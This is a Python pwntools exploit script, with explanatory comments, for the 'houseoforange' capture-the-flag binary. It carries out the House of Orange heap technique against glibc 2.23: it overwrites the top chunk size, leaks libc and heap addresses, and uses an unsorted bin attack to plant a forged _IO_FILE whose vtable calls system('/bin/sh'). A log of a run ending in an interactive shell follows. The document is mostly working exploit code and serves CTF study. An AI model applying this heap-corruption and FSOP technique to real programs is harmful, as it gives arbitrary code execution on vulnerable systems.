#!/usr/bin python
from pwn import *
import sys

p = process('./houseoforange')
debug = 0
if len(sys.argv) > 1:
	debug = 1

def build(length, name):
	p.sendlineafter("Your choice : ", "1")
	p.sendlineafter("Length of name :", str(length))
	p.sendafter("Name :", name)
	p.sendlineafter("Price of Orange:", "10")
	p.sendlineafter("Color of Orange:", "1")

def see():
	p.sendlineafter("Your choice : ", "2")
	p.recvuntil("Name of house : ")

def upgrade(length, name):
	p.sendlineafter("Your choice : ", "3")
	p.sendlineafter("Length of name :", str(length))
	p.sendafter("Name:", name)
	p.sendlineafter("Price of Orange: ", "30")
	p.sendlineafter("Color of Orange: ", "3")

'''
The tech is stunning. If you want to understand it totally,
I suggest you debugging house_of_orange of how2heap. And 
specially it's better if you use gef. Because you can download
the source code of glibc and then debug in a source code level.
'''
#first leaking libc and heap addresses
build(0x70, 'a' * 0x70)
#overwirting top chunk's size field
payload = 'a' * 0x90 + p64(0) + p64(0xf41)
upgrade(0xa0, payload)
'''
gef>  x/20gx main_arena.top
0x55fa7106f0c0:	0x0000000000000000	0x0000000000000f41
0x55fa7106f0d0:	0x0000000000000000	0x0000000000000000
0x55fa7106f0e0:	0x0000000000000000	0x0000000000000000
0x55fa7106f0f0:	0x0000000000000000	0x0000000000000000
'''

build(0x1000, 'b' * 0x1000)
'''
-------------------------------------------
|  a  |      b        |  unused | new_top |
-------------------------------------------
      b:old_top(in unsorted bin)
'''

build(0x500, 'c' * 7 + '\n')
'''
when malloc(0x500), because of large request, chunk b would
be added into large bin first. And then malloc(0x500) from the 
large chunk. It would be split into two chunks: first part is 
returned to user and the last part would be added into unsorted bin.
So the leaking info is the address of largebin list.
'''

see()
p.recvline()
leak_addr = u64(p.recv(6).ljust(8, '\x00'))
print "[+] leak_addr: " + hex(leak_addr)
libc_addr = leak_addr - 0x3c5188
print '[+] libc_addr: ' + hex(libc_addr)
system_addr = libc_addr + 0x45390
print '[+] system_addr: ' + hex(system_addr)
io_list_all = libc_addr + 0x3c5520
print '[+] io_list_all: ' + hex(io_list_all)
upgrade(0x500, 'a' * 15 + '\n')
see()
p.recvline()
heap_addr = u64(p.recv(6).ljust(8, '\x00'))
print "[+] heap_addr: " + hex(heap_addr)

unsorted_chunk = heap_addr + 0x530
print "[+] unsorted_chunk: " + hex(unsorted_chunk)

payload = 'd' * 0x500 + 'e' * 0x20
#beginning of _IO_FILE_plus structure
#placing on unosrted-chunk
#just see house_of_orange.c of how2heap
file = '/bin/sh\x00' 
file += p64(0x61)
file += p64(0) + p64(io_list_all - 0x10) #unsorted bin attack
#the unsorted bin attack is amazing!
'''
for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&   <--- [1]
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
    ...
    }
      
   
So we've corrupted the unsorted bin, the conditon of [1] wouldn't be 
satisfied. Then the chunk would be removed from unsorted bin and added 
into smallbin. And last in the second loop, the security check is not
passed, oops~.
'''
file += p64(2) + p64(3)
vtable = unsorted_chunk + 12*8
file = file.ljust(96, '\x00')
file += 3*p64(0) + p64(system_addr)
file = file.ljust(0xd8, '\x00')
file += p64(vtable)
payload += file

upgrade(0x800, payload + '\n')
if debug:
	gdb.attach(p)
p.recvuntil('Your choice : ')
p.sendline("1")

p.interactive()
'''
And last, we got a shell.
->  heap_exploit python house_of_orange.py 
[+] Starting local process './houseoforange': pid 5825
[+] leak_addr: 0x7f67b2fc5188
[+] libc_addr: 0x7f67b2c00000
[+] system_addr: 0x7f67b2c45390
[+] io_list_all: 0x7f67b2fc5520
[+] heap_addr: 0x55f2f00ad120
[+] unsorted_chunk: 0x55f2f00ad650
[*] Switching to interactive mode
*** Error in `./houseoforange': malloc(): memory corruption: 0x00007f67b2fc5520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f67b2c777e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f67b2c8213e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f67b2c84184]
./houseoforange(+0xd6d)[0x55f2efae7d6d]
./houseoforange(+0x1402)[0x55f2efae8402]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f67b2c20830]
./houseoforange(+0xb19)[0x55f2efae7b19]
======= Memory map: ========
55f2efae7000-55f2efaea000 r-xp 00000000 08:02 3544439                    /home/w0lfzhang/Desktop/heap_exploit/houseoforange
55f2efce9000-55f2efcea000 r--p 00002000 08:02 3544439                    /home/w0lfzhang/Desktop/heap_exploit/houseoforange
55f2efcea000-55f2efceb000 rw-p 00003000 08:02 3544439                    /home/w0lfzhang/Desktop/heap_exploit/houseoforange
55f2f00ad000-55f2f00f0000 rw-p 00000000 00:00 0                          [heap]
7f67ac000000-7f67ac021000 rw-p 00000000 00:00 0 
7f67ac021000-7f67b0000000 ---p 00000000 00:00 0 
7f67b29ea000-7f67b2a00000 r-xp 00000000 08:02 6296120                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f67b2a00000-7f67b2bff000 ---p 00016000 08:02 6296120                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f67b2bff000-7f67b2c00000 rw-p 00015000 08:02 6296120                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f67b2c00000-7f67b2dc0000 r-xp 00000000 08:02 6296082                    /lib/x86_64-linux-gnu/libc-2.23.so
7f67b2dc0000-7f67b2fc0000 ---p 001c0000 08:02 6296082                    /lib/x86_64-linux-gnu/libc-2.23.so
7f67b2fc0000-7f67b2fc4000 r--p 001c0000 08:02 6296082                    /lib/x86_64-linux-gnu/libc-2.23.so
7f67b2fc4000-7f67b2fc6000 rw-p 001c4000 08:02 6296082                    /lib/x86_64-linux-gnu/libc-2.23.so
7f67b2fc6000-7f67b2fca000 rw-p 00000000 00:00 0 
7f67b2fca000-7f67b2ff0000 r-xp 00000000 08:02 6296054                    /lib/x86_64-linux-gnu/ld-2.23.so
7f67b31d4000-7f67b31d7000 rw-p 00000000 00:00 0 
7f67b31ee000-7f67b31ef000 rw-p 00000000 00:00 0 
7f67b31ef000-7f67b31f0000 r--p 00025000 08:02 6296054                    /lib/x86_64-linux-gnu/ld-2.23.so
7f67b31f0000-7f67b31f1000 rw-p 00026000 08:02 6296054                    /lib/x86_64-linux-gnu/ld-2.23.so
7f67b31f1000-7f67b31f2000 rw-p 00000000 00:00 0 
7ffe17147000-7ffe17168000 rw-p 00000000 00:00 0                          [stack]
7ffe1718e000-7ffe17191000 r--p 00000000 00:00 0                          [vvar]
7ffe17191000-7ffe17193000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ whoami
w0lfzhang
'''

'''
some links:
https://github.com/shellphish/how2heap/blob/master/house_of_orange.c
http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
'''